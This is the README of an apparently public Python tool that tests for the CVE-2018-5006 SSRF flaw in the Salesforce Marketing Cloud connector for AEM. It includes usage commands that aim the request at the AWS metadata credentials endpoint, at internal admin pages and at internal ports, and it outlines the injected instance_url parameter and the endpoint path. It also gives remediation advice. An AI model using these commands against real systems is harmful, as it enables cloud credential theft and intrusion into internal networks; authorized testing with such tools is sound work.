# Salesforce SSRF Vulnerability Tester

A Python tool to test for Server-Side Request Forgery (SSRF) vulnerabilities in Salesforce integrations - **CVE-2018-5006**.

## Overview

This tool tests for an SSRF vulnerability in the Salesforce Marketing Cloud (MCM) connector that allows attackers to make the server send HTTP requests to arbitrary URLs. This can be exploited to access internal resources, cloud metadata endpoints (like AWS EC2 metadata), or perform port scanning.

**CVE-2018-5006** affects Salesforce Marketing Cloud Connector and certain Adobe Experience Manager (AEM) integrations.

## Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is intended for:
- Authorized penetration testing engagements
- Security research in controlled environments
- Vulnerability assessment with proper authorization
- Educational purposes

**Do not use this tool against systems you do not own or have explicit permission to test.**

## Requirements

- Python 3.6+
- Required Python packages:
  - requests
  - urllib3

## Installation

1. Clone this repository:
```bash
git clone https://github.com/random-robbie/salesforce-ssrf.git
cd salesforce-ssrf
```

2. Install dependencies:
```bash
pip install requests urllib3
```

## Usage

### Basic Usage

Test a target URL with default settings (AWS metadata endpoint):
```bash
python salesforce.py -u https://target.example.com
```

### Custom SSRF Target

Test with a custom SSRF target URL:
```bash
python salesforce.py -u https://target.example.com -s http://internal-server.local/admin
```

### Using a Proxy

Route traffic through a proxy (useful for debugging with Burp Suite or similar):
```bash
python salesforce.py -u https://target.example.com -p http://127.0.0.1:8080
```

### Command-Line Options

```
-u, --url       Target Salesforce URL (required)
-p, --proxy     Proxy for debugging (e.g., http://127.0.0.1:8080)
-s, --ssrf      SSRF target URL (default: AWS metadata endpoint)
```

### Examples

1. **Test for AWS metadata access:**
```bash
python salesforce.py -u https://vulnerable-site.com
```

2. **Test internal network access:**
```bash
python salesforce.py -u https://vulnerable-site.com -s http://192.168.1.1/admin
```

3. **Port scanning internal hosts:**
```bash
python salesforce.py -u https://vulnerable-site.com -s http://internal-host:8080
```

4. **Debug with Burp Suite:**
```bash
python salesforce.py -u https://vulnerable-site.com -p http://127.0.0.1:8080
```

## How It Works

The tool exploits a vulnerability in the Salesforce MCM customer endpoint by:
1. Generating random tokens for the request
2. Injecting a malicious `instance_url` parameter pointing to the SSRF target
3. Sending a crafted request to `/libs/mcm/salesforce/customer.html`
4. Analyzing the response to determine if the SSRF was successful

If successful (HTTP 200), the server will return the contents fetched from the SSRF target URL.

## Expected Output

### Vulnerable System
```
[*] Testing SSRF on: https://vulnerable-site.com
[*] Target SSRF URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/

==================================================
[+] SSRF VULNERABILITY FOUND!
==================================================
Response:
<AWS credentials or target response content>
==================================================
```

### Protected System
```
[*] Testing SSRF on: https://protected-site.com
[*] Target SSRF URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
[-] SSRF attempt failed (Status: 404)
Response: ...
```

### WAF Detection
```
[-] WAF detected - blocking attempts
```

## Remediation

If you discover this vulnerability in your systems:

1. **Update immediately** - Apply the latest security patches for Salesforce Marketing Cloud Connector
2. **Input validation** - Validate and sanitize the `instance_url` parameter
3. **Allowlist** - Implement strict allowlists for permitted external URLs
4. **Network segmentation** - Restrict server's ability to access internal resources
5. **Monitor** - Log and monitor unusual outbound requests

## References

- [CVE-2018-5006](https://nvd.nist.gov/vuln/detail/CVE-2018-5006)
- [Salesforce Security Advisories](https://help.salesforce.com/s/articleView?id=000352427&type=1)

## Author

**@Random-Robbie**

## License

This tool is provided for educational and authorized testing purposes only. Use responsibly and ethically.

## Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for bugs and feature requests.
